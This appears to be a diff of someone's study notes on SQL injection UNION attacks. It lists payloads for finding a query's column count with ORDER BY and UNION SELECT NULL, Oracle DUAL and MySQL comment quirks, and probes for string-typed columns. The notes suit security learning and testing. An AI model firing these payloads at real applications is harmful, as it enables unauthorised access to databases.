@@ -50,7 +50,7 @@ so we need to find how many columns are being returned from the original query +
 
 ### Determining the number of columns required in an SQLi UNION attack
 
-1 : injecting a serie of ORDER BY clauses and incrementing the specified column index :
+**1 :** injecting a serie of ORDER BY clauses and incrementing the specified column index :
 
 `' ORDER BY 1--`
 
@@ -60,7 +60,7 @@ so we need to find how many columns are being returned from the original query +
 
 `etc...`
 
-2 : submitting a series of UNION SELECT payloads :
+**2 :** submitting a series of UNION SELECT payloads :
 
 `' UNION SELECT NULL--`
 
@@ -68,4 +68,24 @@ so we need to find how many columns are being returned from the original query +
 
 `etc...`
 
-for this second, if the number of nulls does not match the number of columns, the database can return an error.
+if the number of nulls does not match the number of columns, the database can return an error.
+**Why using NULL ?** NULL is convertible to every commonly used data type, so using NULL maximizes the canche that the payload succeed when the column count is correct.
+
+On Oracle, every SELECT query must use the FROM keyword and specify a valid table. A built-in table on Oracle called _dual_ can be used :
+
+`' UNION SELECT NULL FROM DUAL--`
+
+On MySQL, the `--` sequence must be followed by a space. Alternatively, a `#` can be used to identify a comment
+
+### Finding columns with a useful data type in an SQLi UNION attack
+
+Generally, the interesting data will be in string form.
+Having already determined the number of columns, you can test each column by placing a string value, for example if the query return 3 columns :
+
+`' UNION SELECT 'a',NULL,NULL--`
+
+`' UNION SELECT NULL,'a',NULL--`
+
+`' UNION SELECT NULL,NULL,'a'--`
+
+If an error does not occur, then the column is suitable for retrieving string data.
